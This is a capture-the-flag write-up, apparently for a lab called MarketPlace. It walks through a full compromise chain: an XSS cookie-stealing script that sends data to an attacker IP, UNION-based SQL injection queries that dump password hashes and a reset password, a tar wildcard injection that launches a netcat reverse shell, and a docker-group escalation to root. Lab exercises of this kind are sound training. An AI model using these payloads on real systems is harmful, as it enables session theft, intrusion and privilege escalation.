# MarketPlace
## nmap
```bash
┌──(lungdart㉿kali)-[~/tryhackme/marketplace]
└─$ nmap -sC -sV -oN nmap/init 10.10.148.133
Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-13 14:38 AST
Nmap scan report for 10.10.148.133
Host is up (0.11s latency).
Not shown: 997 filtered ports
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c8:3c:c5:62:65:eb:7f:5d:92:24:e9:3b:11:b5:23:b9 (RSA)
|   256 06:b7:99:94:0b:09:14:39:e1:7f:bf:c7:5f:99:d3:9f (ECDSA)
|_  256 0a:75:be:a2:60:c6:2b:8a:df:4f:45:71:61:ab:60:b7 (ED25519)
80/tcp    open  http    nginx 1.19.2
| http-robots.txt: 1 disallowed entry 
|_/admin
|_http-server-header: nginx/1.19.2
|_http-title: The Marketplace
32768/tcp open  http    Node.js (Express middleware)
| http-robots.txt: 1 disallowed entry 
|_/admin
|_http-title: The Marketplace
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect resu
```

## html site
### base
* /admin exists
* Website has an XSS with new postings, and a way for an admin account to automatically view them and message you.
  * Craft a JS payload to fetch a file from me with the cookie as the page name
```html
<script>
var image = new Image();
image.src = "http://10.6.56.205:8000/"+document.cookie;
</script>
```
```
token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjIsInVzZXJuYW1lIjoibWljaGFlbCIsImFkbWluIjp0cnVlLCJpYXQiOjE2MTMyNDI2NTF9.QqVsgXrbavIvH1okpZd38EIul0HWBowab6skp6fBvmE
```

That gets the first token
```THM{c37a63895910e478f28669b048c348d5}```

### admin account
Usernames
  * system
  * michael (admin)
  * jake (admin)

  Getting users is vuln to SQL injection (Mysql errors)

### SQLMAP
```bash
sqlmap --tables -u http://10.10.148.133/admin?user=1* --cookie='token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjIsInVzZXJuYW1lIjoibWljaGFlbCIsImFkbWluIjp0cnVlLCJpYXQiOjE2MTMyNDc4ODN9.rQZNqwUF5VarH4OatXZk6bsXp6jv_OeAq_WCX7LL6Aw'
```
Not finding anything, and breaking the stolen token. Manual injection required

### Manual injection
#### User table
```
/admin?user=4 AND 1=2 UNION SELECT username, password, 1, 1 FROM users LIMIT 1, 1
michael: $2b$10$yaYKN53QQ6ZvPzHGAlmqiOwGt8DXLAO5u2844yUlvu2EXwQDGf/1q
jake: $2b$10$/DkSlJB4L85SCNhS.IxcfeNpEBn.VkyLvQ2Tk9p2SDsiVcCRb4ukG
```

No luck cracking these passwords.

#### Messages
```
/admin?user=4 AND 1=2 UNION SELECT group_concat(table_name),1,1,1 FROM information_schema.tables WHERE table_schema='marketplace'
```
```
/admin?user=4 AND 1=2 UNION SELECT group_concat(column_name),1,1,1 FROM information_schema.columns WHERE table_name='messages'
4 AND 1=2 UNION SELECT group_concat(message_content),1,1,1 FROM messages
```

BINGO
Password reset message "@b_ENXkGYUCAv3zJ"

## ssh
### Own USER
jake:@b_ENXkGYUCAv3zJ
/home/jake/user.txt

### Own Root
User jake may run the following commands on the-marketplace:
    (michael) NOPASSWD: /opt/backups/backup.sh

```bash
#!/bin/bash
echo "Backing up files...";
tar cf /opt/backups/backup.tar *
```

#### Tar wildcard command line injection

Tar wildcard exploit. Tar can mistake file names for command line arguments. Since we can run this script as michael, we can make michale run any script we want.
```bash
echo "rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.6.56.205 5050 > /tmp/f" > shell.sh
echo "" > "--checkpoint=1"
echo "" > "--checkpoint-action=exec=sh shell.sh"
sudo -u michael tar cf /opt/backups/backup.tar *
```

#### priv esc with docker
Once in as the michael user, it appears he's in the docker group.

Create a new docker container with /root virtually mounted to /mnt and read the flag
```bash
docker run -v /root:/mnt alpine cat /mnt/root.txt
```
